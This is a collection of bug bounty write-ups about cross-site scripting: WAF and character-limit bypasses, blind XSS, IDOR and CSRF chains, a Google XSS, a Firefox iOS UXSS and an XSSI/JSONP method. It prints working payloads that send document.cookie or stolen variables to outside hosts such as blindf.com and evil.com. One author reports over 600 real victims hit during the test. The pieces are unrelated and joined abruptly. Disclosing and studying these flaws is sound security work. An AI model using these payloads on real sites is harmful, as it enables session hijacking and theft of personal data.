I am sitting in my room for last 3 days due to corona virus outbreak world wide and feeling really bored . So I thought why not do a write-up what I promised really long ago 🤭. Few months back in My Tweet I shared a way to bypass XSS WAF & Character limitation what I found on a private bug bounty site. Today I will share more technical details about that bypass . Hope you guys will enjoy it 😇 Back in 2019 I was testing a web application what allows a user to create a photo album and upload photos in it and the interface looks like below screenshot - Press enter or click to view image in full size Application Interface 🤔 Also there is option to rename images when I click on Edit , So normally any researcher will test for XSS here as there is a way to change the photo name . So I changed the photo name to below payload - xsstest'\">{{7*7}} Then I noticed following things - There is 15 character limitation in that input so I was able to inject xsstest'\">{{7*7 these characters . All special characters was being escaped properly . And at last I was being redirected to /error.aspx?code=500 when I tried to load that album again due to WAF and I have to rename the image to xsstest then I was able to load the album again . It looks like this input is well protected form XSS attacks . Then I start playing with other available options and connected Burp Suit tools with my browser and keep it open to capture all background requests in HTTP History . Then when I was going through HTTP History tab and one background request endpoint caught my attention what looks like https://subdomain.company.com/ajax/generateImageList.ashx?json={albums:[{\"id\":\"<picture_ID>\",\"value\":\"on\"}]} . This request was for album Slideshow option and that endpoint page source was :- <a href=\"https://image-link.com/image.jpg\" title=\"xsstest\" rel=\"lightbox[gallery]\">84**00000</a> Look at the title attribute value what is our image name in that album . So again I renamed my picture name to xsstest'\"> and again checked ajax/generateImageList.ashx page source and this time it was - <a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00000</a> So in this new generateImageList.ashx endpoint - Users input is not being escaped properly . No WAF detection . But we still have the 15 character limitation what makes this xss useless . The smallest xss payload we can think of for this scenario is \"oncut=\"alert() Which will result a blank popup when we Press CTRL+X on Windows & COMMAND+X on OS X on keyboard :- <a href=\"https://image-link.com/image.jpg\" title=\"\"oncut=\"alert()\" rel=\"lightbox[gallery]\">84**00000</a> Press enter or click to view image in full size Blank Popup 😪 I tried all possible way to bypass this character limitation and was unable to do it . I stopped testing here and saved about this endpoint in my To do list note to take a look here when I again test this asset . After about seven months I again started testing this asset and again working on this endpoint . Now noticed that I can upload multiple photos on album and by selecting all photos of album the Slideshow option request endpoint changes to https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{\"id\":\"<album_ID>\",\"value\":\"on\"}]} and that page source is :- <a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00000</a><a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00001</a> So now we have multiple injections here . So why not uplaod 5 pictures in the album and use My Tweet mentioned payload ? Payload : 1st Injection: */</script><!-- 2nd Injection: */.domain)/*xxx 3rd Injection: */(document/*xx 4th Injection: */prompt/*xxxxx 5th Injection: \"><script>/*xss Page source after final injection become :- <a href=\" https://image-link.com/image.jpg \" title=\" \"><script>/*xss \" rel=\"lightbox[gallery]\">84**00000</a><a href=\" https://image-link.com/image.jpg \" title=\" */prompt/*xxxxx \" rel=\"lightbox[gallery]\">84**00001</a><a href=\" https://image-link.com/image.jpg \" title=\" */(document/*xx \" rel=\"lightbox[gallery]\">84**00002</a><a href=\" https://image-link.com/image.jpg \" title=\" */.domain)/*xxx \" rel=\"lightbox[gallery]\">84**00003</a><a href=\" https://image-link.com/image.jpg \" title=\" */</script><!-- \" rel=\"lightbox[gallery]\">84**00004</a> Now visiting https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{\"id\":\"<album_ID>\",\"value\":\"on\"}]} will execute the payload we used :- Press enter or click to view image in full size Boom 😎🔥 Now you may have question why I used x character multiple time in 2nd to 5th payload ? The answer is in album images are sorting based on the name length + When it was uploaded . So I used x character multiple time to make all image name length same, so-that when I upload images it sort based on image upload time . Hope you guys enjoyed this one . PM me at Twitter or Facebook anytime if you have any questions . #Stay_Home #Stay_Safe #Wash_Your_Hand_Frequently #Hack_The_Planet 🔥 Follow Infosec Write-ups for more such awesome write-ups.

The target is an application that helps manage finances. Before finding this particular bug chain, I had discovered and reported a few IDORs in the application which were already fixed and paid within 30 minutes. Then it occured to me that some of the IDORs are sitewide and they also fixed it too. Cross Site Scripting They have a feature to request suppliers in the application. So, I injected a XSS payload in the “Name of supplier” and requested the supplier. Nothing happened at first until I opted to delete the supplier and got a pop-up! That was successful but this doesn’t seem exploitable as it was Stored but Self XSS. PS: I didn’t include the payload here since anyone would have worked. Insecure Direct Object Reference Although I know they had fixed some IDORs in the past, but wanted to escalate the Stored Self XSS anyway. Luckily for me, I found another IDOR which was not handled by the previous fix. This time I was able to view, edit, and delete suppliers of other users. The body of the PUT request looked like the following: {\"shop_account_request\":{\"request_name\":\"Name of supplier\",\"reference_contact_name\":\"ContactName\",\"reference_contact_email\":\"Email\",\"reference_contact_phone\":\"Phone\",\"id\":IncrementalID}} Then I could set a XSS payload as the “Name of supplier” for any of the request for supplier via the Incremental IDs. And whenever they feel a name is weird and opt to delete, the XSS payload would be executed. Thank you for your time. And I hope you enjoyed reading this.

I will not take much time and keep the write-up simple and point to point. It was a private program so we will call it https://redacted.com. I used https://blindf.com in order to exploit it. It's a platform/tool/framework to find blind XSS. Attack Starts: Found a form on https://redacted.com I put Bhtml payload + BXSS payload in the text field Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"></script><script src=https://blindf.com/bx.php></script> Result: WAF stopped me to submit the form. 3. I removed the BXSS payload. Now the payload was Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/> Result: WAF did not stop me and I successfully submitted the form. Next day Blindf confirmed the BHTML payload execution in the backend. Now It’s time to submit the Bxss payload. Because I knew that the backend portal is vulnerable and I just have to submit the Bxss payload. 4. Next Payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"><svg onload='with(top)body.appendChild(createElement(\"script\")).src=\"https://blindf.com/bx.php\"'> Result: WAF did not stop me and I successfully submitted the payload. But again only BHTML payload worked and BXSS did not. Now again, its time to modify the payload. 5. Next payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"> sfds\"><base href=\"https://blindf.com\"><script nonce='secret' src='./bx.php'></script> Result: WAF stopped me and I could not submit the form. Frustration was on the peak. Again its time to change the payload. 6. Next payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\">\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmxpbmRmLmNvbS9ieC5waHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))> Result: Bypassed the WAF but again only BHTML worked and BXSS failed. Now it was not the time of payload modification but thinking about the situation. Situation step by step: I used BHTML + BXSS payloads. Some Bxss payloads bypassed the WAF but did not execute in the backend portal where Bhtml payloads were going well and I was receiving back response from my BHTML payloads. Maybe something was stopping my remote js file from execution. [CORS or Same-origin policy] So I have to execute BXSS without including remote js file. But how can I confirm the payload execution in the backend if I just show an alert popup to them “<img” tag was working but I could not include remote js file. I have to make a payload that can respond back and confirm js code execution. 7. Now it’s time to modify the payload and attack again. Payload used: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"> <img src=https://blindf.com/a.jpg onload=this.src='https://blindf.com/oc.php/?c='+document.cookie> Result: WAF bypassed.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow We Found Another XSS in Google with Acunetix | Acunetix Get a demo Toggle navigation Get a demo Product Why Acunetix? Solutions INDUSTRIES IT & Telecom Government Financial Services Education Healthcare ROLES CTO & CISO Engineering Manager Security Engineer DevSecOps Case Studies Customers Testimonials Pricing About Us Our story In the news Careers Contact Resources Blog Webinars White papers Buyer’s guide Partners Documentation Get a demo THE ACUNETIX BLOG Web Security Zone How We Found Another XSS in Google with Acunetix Andrey Leonov | February 17, 2020 You have to be a very lazy hacker not to try to find issues in Google. Link and I are not lazy but we may be a bit luckier than most. And we use good tools, which helps. Some time ago, we found an XSS in Google Cloud with the help of the Acunetix vulnerability scanner . Recently we found another XSS vulnerability. Here is how it happened. Step 1. A Report from the Vulnerability Scanner As part of our research, we regularly scan various Google services using different tools, including Acunetix. We simply have a long list of targets and go through each of them. One of such target scans in December 2019 resulted in the scanner reporting an XSS with the following payload: https://google.ws/ajax/pi/fbfr?wvstest=javascript:domxssExecutionSink(1,%22%27%5C%22%3E%3Cxsstag%3E()locxss%22) Such reports sometimes turn out to be false positives and we don’t react to them every time but this was Google. So it was very much worth having a deeper look. Step 2. Analyzing the HTTP Response The first step was to examine the HTTP response in detail: HTTP/1.1 200 OK ... <!doctype html><div style=\"display:none\"> <form method=\"post\"> </form> <script nonce=\"+ao+4Egc+7YExl3qyyWMJg==\">(function(){var a=window.document.forms[0],b=location.hash.substr(1);b||window.close();var c=b.split(\"&\"),d=decodeURIComponent(c[0]);a.action=d;for(var e=1;e<c.length;e++){var f=c[e].split(\"=\"),g=document.createElement(\"input\");g.type=\"hidden\";g.name=f[0];g.value=decodeURIComponent(f[1]);a.appendChild(g)}a.submit();}).call(this);</script> </div> This response seemed to contain an empty form and a bit of JavaScript code. To understand it better, we made it more readable: (function() { var a = window.document.forms[0], b = location.hash.substr(1); b || window.close(); var c = b.split(\"&\"), d = decodeURIComponent(c[0]); a.action = d; for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } a.submit(); }).call(this); Next, we tried to understand every step of the above JavaScript code. See the comments within the code to understand how it works. (function() { // Function that is going to be auto-executed }).call(this); (function() { // The variable “a” points to a form that is empty right now var a = window.document.forms[0], // The variable b is a location hash without the # character b = location.hash.substr(1); // If there is no b (no hash in the location URI), try to self-close b || window.close(); // Split the location hash using the & character var c = b.split(\"&\"), // And decode the first (zero) element d = decodeURIComponent(c[0]); // The hash value becomes the action of the form a.action = d; // The below content is not important in the context of the issue for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } // The form is auto-submitted a.submit(); }).call(this); Step 3. The Proper Payload Once we understood how the function works, all we needed is a proper payload. We came up with the following one: https://google.ws/ajax/pi/fbfr#javascript:alert(document.cookie) We also decided to see if this vulnerability affects other Google domains: https://google.com/ajax/pi/fbfr#javascript:alert(document.cookie) The Fix Google did not have to work hard on fixing the issue. Only one line of code had to be changed to eliminate the vulnerability: (function() { var a = window.document.forms[0], b = location.hash.substr(1); b || window.close(); var c = b.split(\"&\"), d = decodeURIComponent(c[0]); // Only the below line needed to be changed // to check if the location hash begins with http: 0 != d.indexOf(\"http\") && window.close(); a.action = d; for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } a.submit(); }).call(this); The Timeline Vulnerability reported: Dec 27, 2019, 01:01 AM Vulnerability triaged: Dec 27, 2019, 08:32 PM Issue fixed by Google: Jan 8, 2020 Bounty paid: Jan 8, 2020 Bounty amount: USD 5000 Get the latest content on web security in your inbox each week.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCVE-2019-17004âSemi Universal XSS affecting Firefox for iOS Home Team Careers Privacy policy Impressum Dissemination @ Cliqz Tech @ Cliqz search privacy web security CVE-2019-17004âSemi Universal XSS affecting Firefox for iOS This bug allowed an attacker to potentially execute malicious JavaScript on arbitrary origins. March 30th, 2020 There is a kind of security flaw in Web browsers and extensions that can enable an attacker to bypass the same-origin policy [1] checks and take over your online activity by simply having you visit a web page; allowing accessing your bank account, learning about your search queries on Google, your emails, your messages on Facebook, etc. It can even enable the attacker to impersonate you and perform actions on your behalf. These flaws are called: Universal Cross-Site Scripting [2] . In October 2019, we discovered such a security flaw in Firefox for iOS, which allowed malicious actors to execute JavaScript on arbitrary origins. Cliqz browsers are based on Firefox , and from time to time we conduct security and privacy audits of upstream projects, other browsers and our own products across platforms. These audits allowed us to discover some critical issues in the past [3] . In November last year, the Cliqz browser for iOS was undergoing a complete overhaul. While auditing the app for security issues during its development phase, we discovered a Universal Cross-Site Scripting (UXSS) vulnerability. We tested the production version of Firefox (Version 19.1 - 16203) and realized that it had the same vulnerability, therefore we reported the issue via the Client Security Bug Bounty Program to Mozilla. At that time we tested a few other popular browsers on iOS and none of them had this issue. Some of them, like Safari, were even explicit in their error reporting :) However, in January this year, when we were about to publish our findings, we did our due diligence and performed a sanity check on popular iOS browsers again. We found that this time Brave for iOS suffered from the same security issue. After reporting the issue to Brave, they promptly fixed it, but we wanted to wait for a few more months before publishing the details about this security issue to give users time to update to the latest version. The Attack Letâs imagine the user (victim) opens Firefox for iOS, and does a query on default search engine (In this example: https://www.google.com/). The user then visits an attacker-controlled website in the same tabâby either pasting a link, selecting a link from the webpage or any other means. This website returns the following malicious response Location header: Because of a bug in the browser, an attacker is able to execute JavaScript in the context of the previously visited website (i.e. google.com in this case) by returning a redirect to javascript: doEvil , Being able to execute JavaScript on a different origin, opens a wide range of attacks. For example, not only can the attacker read sensitive data like cookies or the URL from webpages. They can also return JavaScript which performs API requests to retrieve information such as the last 10 queries that the user has submitted on google.com. It is important to note that this issue only classifies as semi-UXSS because attackers cannot steal data from any website of their choice, but are limited to the last visited domain. For example, in the above case, if the attacker returns a JavaScript code in location header, that tries to steal data or execute actions on https://meine.deutsche-bank.de/trxm/db/ , the attack will only work as long as the last website visited in that tab was https://meine.deutsche-bank.de/ . However, even given the above limitations the attacker can curate special links and lure the users into opening these malicious links by sharing them on social media, chat platforms, etc. If the user clicks on such links on these websites, the attacker can now try and exfiltrate sensitive user data from the website where the link was clicked from. Given the impact of the vulnerability, the fact that it was present in production versions and was easily exploitable, Mozilla classified this bug as sec-critical [4] . Cause The issue here was that Firefox for iOS had insufficient checks to block JavaScript from being executed when returned via Location response header. This bug originated from the bookmarklets functionality [5] added in Firefox for iOS. In order to fix this security issue, Firefox decided to remove this functionality altogether from the browser. Timeline UXSS flaws in browsers are neither new nor uncommon [6] . We appreciate Mozillaâs and Braveâs efforts in enabling security researchers to not only report such issues, but also for fixing them with the highest priority to keep the users safe. 2019-10-15: Issue discovered and reported to Firefox . 2019-10-17: Firefox developers acknowledged and confirmed the bug as a security issue. 2019-10-17: Issue fixed on Github . 2019-10-22: Firefox for iOS v20.0 released with the security issue fixed. 2020-01-31: Same issue discovered in Brave for iOS [7] and reported to the Brave browser team via HackerOne . 2020-02-01: Issue was patched in Brave for iOS and a new version was released. 2020-02-04: Brave confirmed via HackerOne, that new version was published on the App Store. Footnotes https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy . â©ï¸ Unlike the common XSS attacks, UXSS is a type of attack that exploits client-side vulnerabilities in the browser or browser extensions in order to generate an XSS condition, and execute malicious code. When such vulnerabilities are found and exploited, the behavior of the browser is affected and its security features may be bypassed or disabled. Source â©ï¸ https://0x65.dev/pages/dissemination-cliqz.html#security â©ï¸ Critical vulnerabilities are urgent security issues that present an ongoing or immediate danger to Firefox users. There is no technical difference between sec-critical and sec-high vulnerabilities, they only differ based on the risk users are exposed to. Certain sec-critical vulnerabilities will cause an immediate dot-release to be issuedâ Source . â©ï¸ https://en.wikipedia.org/wiki/Bookmarklet â©ï¸ Some examples of UXSS bugs in Browsers: UXSS in Safari WebKit , Browser logic vulnerabiliteis , UXSS: Origin confusion when reloading isolated data:text/html URL , Firefox uXSS and CSS XSS , and UXSS in Chrome Android . â©ï¸ We did not find the vulnerability in Brave in October, as the version of Firefox they were using was an old one. Brave did a release in Novemberâ19 , which was based on the version of Firefox that had the security issue. Therefore, in our sanity check before publishing the blog post in Febuary we found Brave for iOS to have the same security issue. â©ï¸ Share this article Â© Cliqz GmbH - All rights reserved RSS Onion DAT"}

So i tried to find XSS in the group name and i found it quickly, like pretty quickly. My payload was <script>alert(1)</script> in the group name and i got a pop-up. Press enter or click to view image in full size So i tried to see if other users get impacted as well. I quickly created an account and invited the user to my group. The XSS didn’t execute, it was all encoded. I tried to bypass it but didn’t have any luck. So this was just a Self XSS.😑 So i started looking around for something else and i noticed that group names were encoded everywhere except for the dialog box that appeared after creating a group. We’ve added zxc Press enter or click to view image in full size Turns out the self XSS i found was of the dialog box and not the group name itself and so i thought what if somehow i managed to create a group on behalf of the user and then the dialog box will appear executing the XSS. So i started burpsuite and i looked at the request and voila. Press enter or click to view image in full size There was no CSRF protection against the request so i quickly generated a working PoC and tried it and boom XSS got executed and i was like. This was a great find for me as it impacted other users. Technically i don’t think its a stored XSS as it will execute only once after the user visits the link. Press enter or click to view image in full size Bounty They fixed it quickly within 2 days by completely removing the dialog box and adding CSRF protection. I hope you learned something from this and if you liked it then please share. Follow me on twitter — https://twitter.com/abhishekY495 Thank You.

As the title says the bug was Reflected XSS. The parameter which was vulnerable to XSS was not at the website of the program but in the code which was at the GitHub respository of the program. I searched at GitHub by the name of private program and found they have few codes written in different programming languages. Out of those i look for bug at the PHP code. So ,i look for $_GET[’someParameter’] which should take value of “someParameter” like this localhost/ThePHPcode/thePage.php? someParameter=XSS_PayLoad And successfully was able to find one of the parameter in the one of the code file which was a default error page as mentioned above i.e. $_GET[’someParameter’] Now , i inserted the payload and successfully able to pop up the alert box with document.cookie. So, i report them by explaining that if some website use their code to integrate the functionality which their code provide then that website becomes vulnerable to XSS because that website have their vulnerable code. This report was submitted more than a year ago from today’s date. So, i got surprise of $150 after a year.

I b̶e̶l̶i̶e̶v̶e̶ ̶t̶h̶e̶ ̶r̶e̶p̶o̶r̶t̶e̶r̶ ̶i̶s̶ ̶u̶n̶d̶e̶r̶p̶a̶i̶d̶ ̶s̶i̶n̶c̶e̶ ̶s̶e̶r̶i̶o̶u̶s̶ ̶i̶n̶f̶o̶r̶m̶a̶t̶i̶o̶n̶ ̶w̶a̶s̶ ̶l̶e̶a̶k̶e̶d̶ ̶¯̶\\̶_̶(̶ツ̶)̶_̶/̶¯̶,̶ ̶&̶ decided to share the methodology I follow. tl;dr (also read important notes at the bottom) Press enter or click to view image in full size Cheat sheet or something idk lol Good reads, in case you’re new to XSSI/JSONP: XSSI: https://www.scip.ch/en/?labs.20160414 JSONP: https://www.sjoerdlangkemper.nl/2019/01/02/jsonp My Methodology : After spidering the website (manual & automated), I filtered the results in Burp suite by MIME type, then skim through the responses of type “ script ” for sensitive information. Press enter or click to view image in full size Filtering by MIME type I found a JS file which includes all the information that I filled in when signing up for an insurance policy. This included SSN, limited medical history, visa info, name, phone number, DOB, address etc. Yikes . I look at the HTTP GET request for the JS file to make sure that it doesn’t require CORS triggering headers like: Authorization, X-API-KEY, X-CSRF-TOKEN, X-whatever At this stage if it does have CORS headers then, the attack will fail , unless I also find a CORS issue. In this case, no special headers were needed, so I could include the JS file on a web page with a script tag and send it to any server leaking some serious PII, with the POC being similar to: <script src=\"https://target.com/vuln.js\"> </script> <script defer> // var_name is a variable in vuln.js holding sensitive information console.log(var_name); // sending information to an attacker controlled server fetch(\"https://evil.com/stealInfo?info=\"+var_name); </script> You can use the same way to find JSONP callbacks by appending parameters like callback=some_function, jsonp=blah on all paths that return sensitive information. Important Notes: Sometimes you’ll need multiple parameters to trigger a JSONP response. For example: http://target.com?callback=test → no JSONP http://target.com? type=jsonp&callback=test → returns JSONP If the response has Content-Type: application/json but the body has JSONP/javascript, and the X-Content-Type-Options: nosniff header is NOT in the response, the exploit still WORKS . For JSONP, different callback parameters might work on different endpoints even on the same website. Example: https://target.com/profile_info? callback =test→ no JSONP https://target.com/profile_info? jsonp= test→ returns JSONP But, on a different path on the same site: https://target.com/ account_info ? jsonp =test→ no JSONP https://target.com/ account_info ? jsoncallback =test→ returns JSONP Feedback and constructive criticism are appreciated, thanks for reading!

The story : I was invited some months ago to a private bugcrowd program that was going to start some days later. I found some bugs and took a break. During the last 5 days of the program I told myself I have to find some bugs before this program ends ( I want $$ boiiii) so I took another view of the program. Checked the scope again etc… This private program was a big social network (can’t tell the name it’s private bruh) but the point is I went to create a new account. Username : I enter an XSS payload but no special character allowed : <:’();?> and the field was limited to 20 characters : Press enter or click to view image in full size So I forgot about XSS and looked for another bugs. Later I visited the 2nd in scope domain that was another social media, tried to create a new account using my email but I got an error : User already registered, please login. What happens ? Seems like the 2 sites use the same database so you could use the same account for the 2 sites. So I logged in and moved to my profile and though I will try and edit my username here, I was surprised that there was not characters restricted :D I was like : But this field is limited to 20 chars too :( I first entered a simple payload to confirm the XSS : <svg/onload=alert()> = 20 chars I saved and visited my profile on the main site (I want it to work on the main site because the bounties here were higher). And boom alert box appear :D Now that XSS is valid, time to work on a XSS payload to log cookies of who ever visits my profile, because remember : the higher the security impact is, the higher the bounty will be, thanks master yoda. But the problem is, how to enter a valid 20 chars XSS payload to log cookies? the xsshunter tool is useful but way too long, so I started digging every night and after 48 hours I found this tweet with this short payload from @0x6D6172696F : Press enter or click to view image in full size <script/src=//⑭.₨> = 18 chars (₨ here is Indian Rupee and is considered as 1 char instead of 2, same for the ⑭) But it says only in MS Edge so I told myself I have nothing to lose so I entered this payload in Chrome and Firefox and boom. XSS triggers. Now, I had to rent a (2 numbers).rs domain for the PoC, but the prices are quite high for me (90 usd approx), so I asked myself how can I reach the highest impact without spending 90 usd ? After some days I had an idea, I directly went to namecheap.com (thanks to @brutelogic) to check the cheaper .2chars domain and found .pw, so I checked for RsRs.pw : It was 90 cents/year :D So the domain + dns = approx. 2.10$ I directly went to the panel and redirected rsrs.pw to my xsshunter link (name).xsshunter.com where my blind XSS payload is hosted, returned to the site and created this payload : <script src=//₨₨.pw> = 20 chars. Saved it and visited my profile, and boom : Press enter or click to view image in full size Me, talking to myself : After 1 month (till they fixed this) I got +600 victims without doing anything (kept receiving emails from xsshunter) and +1000$ bounty :) I know this is long but I can’t resume 5 nights of work in 10 lines ^^ Take-away: When you see characters limitation or when a character is restricted somewhere, try to embed 2 chars into 1 or use the Greek dictionary to find a similar character. Sometimes you can go to an out of scope domain or lowest bounty domain to get a valid bug/high bounty bug Thank you for reading, Daher Mohamed aka m0m0x01d :) Tech Bug Bounty Pentest Bugcrowd -- -- 4 Written by Mohamed Daher 458 followers · 0 following Hey Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Got some unusual XSS vulnerabilities for last months, but today I want to discuss the general idea of explanation, since the writeup for each of these vulnerabilities is small. So let’s go!👨‍💻 Disclaimer: there will not be complicated explanations and code analysis, this is a simple discussion of the strange concepts of protecting 5 applications and breaking it. Okay, so we have one HUGE shop-company, that has a lot of sub-domains and different applications running on them: Press enter or click to view image in full size It will be 5 parts with short story about one XSS, protection and breaking in each one. Part 1 — Stored XSS for mobile on the forum Really love forums since there are a lot of potential vulnerabilities due to a huge list of functions . I went to the forum.example.com/post?id=123 and started testing of File Upload via URL functionality — here I noticed that it taking the name of file and inserting it twice on the page — in <img> tag and in the description of the file, it looks like: Press enter or click to view image in full size Me : what if insert “ to the name? Ok, lets test http://…/1.webp” Site : Press enter or click to view image in full size Me : Ez, go onerror and report it! Site : Ahahahahahah 👋 What happens? All the DOM-events are removing ( <img/src=x/onerror=a> going to <img/src=x> 🤯). But, but it turned out that not all. As the world is always improving, DOM-events appeared for mobile too — so they were not blacklisted and we got Stored-XSS for mobile devices. Finally it was like: Also do not forget that you can use alert`1` instead of alert(1) (here service blocked all the parameters inside “()”) R esume : no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try. Here we saw that a quote was inserted into html-code — and with the idea “I won’t believe that you will block all the possible DOM-events” we found that the mobile events were not blacklisted and got Stored XSS in forum post. Part 2 — Reflected XSS on email preview I got an email from our HUGE-shop, and they use the domain email.example.com to view emails, like email.example.com/view?id=123&key=abc&statname=DiscountEmail . The parameter “statname” was <input type=”hidden”> and did nit filter the “ , but filtered <> . So, we just looked how to exploit XSS in hidden input and founded “ accesskey=’X’ onclick=’alert(1)’ ”. It worked, and we got Reflected-XSS. Resume : You will increase your chances of finding vulnerabilities if you subscribe to newsletters from the service that you are testing. Firstly , you will receive news about service updates, and will be able to test it faster than other hackers (I do remember how some guy tested YouTube Beta-studio as soon as it was presented and found great IDOR in 15k$). Secondly — it is quite possible that in the email you will find vulnerable links due to less attention to such minor functionality. So after finding non-filtered quotes and quick-recon in Google “XSS hidden input”, we have found the way to exploit it with “accesskey”. Part 3 — Stored XSS in live support chat They had domain support.example.com, where we can find some information about using the service and chat online with manager in case of needing of the help. And you know what — I started chat with manager, and inserted <img src=”x” onerror=”alert(1)”> — it was injected into html-source! I was very surprised…🙈 Press enter or click to view image in full size As I later understood, no one could get to test this thing — first you have to go to the site at a time when managers are online, and this time is limited to 6 hours a day. Secondly, you need to start a chat, and for this we need to wait for about half an hour to start a conversation with an online manager. That is, from the 3rd time I decided to test this functional, and from 5th time I got into the chat — I think this explains why no one found this thing before. Resume : Any company has a lot of functionality, and sometimes some things remain outside the scope of developers. We all know that we need to test all the possible functionality, but, unfortunately, sometimes we miss vulnerabilities due to laziness or fatigue. Here we found a service that was probably created a very long time ago, but was not updated from a security point of view, since no one checked it. Part 4 — Reflected XSS in User Dashboard This is the longest vulnerability, if we count from the time when I found the first clue about the presence of the vulnerability, and until the time when I finally exploited it (Before this it was Race Condition in purchasing functionality with about 1 month. Just so that you understand how this process happens with me — when I find some interesting things, I usually record bugs info, and later, when new ideas appear, I return to them and continue to exploit). Are you become to be interested in? 😊 So here we have User Dashboard, and functionality of filtering our activities — we can insert value “ time_from ” to filter it with the dates. It was not filtering quotes, so we quickly inserted quote and got: Press enter or click to view image in full size Ok, next step — does it filter “< >” . Yes, so I decided that we would exploit this via an input element with DOM-events. But after ‘ time_from=”777\" onfocus=”alert(1)” ’ I got it: Press enter or click to view image in full size What just happened? Like in the Part1, it is filtering DOM-events and removing it . But, everything is much more complicated — they don’t have a blacklist, they just block all the parameters in the tag that starts from “on” 🤷‍♂️🙂️🤷‍♂️ Suddenly I was attracted by another coincidence on the page with the entered data and I saw such a strange field: Press enter or click to view image in full size It was something like break-links logger and… here “<>” were not filtered: Press enter or click to view image in full size I want to stop at this step so that you understand what is going on: we have a filtering function for our activities ( user.example.com/activities?time_from=777&acc=submit , and the “ time_from ” parameter is vulnerable. But there is protection in the application: it removes events (the WAF finds everything inside the tag that starts on “on”). If this happens, the logger fires, captures the broken link, and inserts it in a strange way to page source without filtering “ and <> 👍 But you remember that all DOM-events are removing — I started looking for tags that you can insert and receive XSS, but it turned out that it cuts them out just like events. Another one “but”: I noticed a strange thing — if I wrote a tag, but didn’t close it — it didn’t delete it, that is, only the closed tag was cut out. So it turned into: Press enter or click to view image in full size YES!😱 So now we can insert link to execute script, but how to close script tag? If the src is given in script tag — all the source is ignoring inside the tag, so we just need any </script> later on the page. Finally source looks like: Press enter or click to view image in full size Let me please explain again what just happened: so we found the broken value “ old_request ”, that creating if we add something potential danger to url (DOM-event). And in this value we can insert ‘<>” into source, but still can not insert tags and DOM-events. But since the input tag was closing itself — we insert “<script/src=//url and WAF do not see it as dangerous input, so do not removing. Then we discard all the garbage that is passed later through ? (as parameters for the GET request). Now the JavaScript logic gave us an advantage — since the resource for the script is specified, everything inside the tag will be ignored, and the site will wait for the closing tag — which will meet somewhere further anywhere in the source, for example, calling jQuery. So the source logic: Press enter or click to view image in full size Resume : no blacklists will help due to the improving of technology — everything cannot be prevented. But filter quotes — it’s quite possible to try. [PART1] So here we got unfiltered quot, then strange “logging functionality” with unfiltered <>, and even WAF with his blacklists is a little hard — we finally exploited it with understanding of the logic of HTML and JavaScript. Part 5— Self XSS + Clickjacking = Nice XSS The last one XSS — will be easy to understand. You sometimes meet Self-XSS, in the functionality of the editing users data, in the form of feedback, etc. But because of the fact that there is no definite request with the help of which XSS is injected — such vulnerabilities are considered as N/A due to the fact that user actions are required. But, we do have some great thing as Clickjacking — terror of the past 10 years of the web (previously it was very widespread vulnerabilities, as now IDOR). I think you know what is it, but I hope to be useful and explain this to beginners. This vulnerability arises when the site allows to be inserted to <iframe> and thus we impose it invisibly and make some forms that interfere with the coordinates of how that functionality is located on the attacked site that we want to hack — and when user use attacker’s site and inserting data there — user inserting data to another site due to iframe. Here it is described in more human language: https://www.owasp.org/index.php/Clickjacking . So on feedback.example.com/feedback we can left feedback, it forwards to another non-scope service, but inserts on the origin page “Thanks [ username ]”. And this [ username ] was not filtering any html-source, directly inserting everything to the page. Since we did not have direct request, we started to check the X-FRAME — to my luck, it turned out to be vulnerable to clickjacking, and I just created an html+css form, which showed how it works. Here you can find examples of great reports for Clickjacking: https://www.google.com/?q=site:hackerone.com%20intitle:clickjacking Resume : Increase your knowledges, because this is what will always be with you, and will help everywhere. Here, thanks to what we knew about the clickjacking , we exploited Self-XSS without any problems.

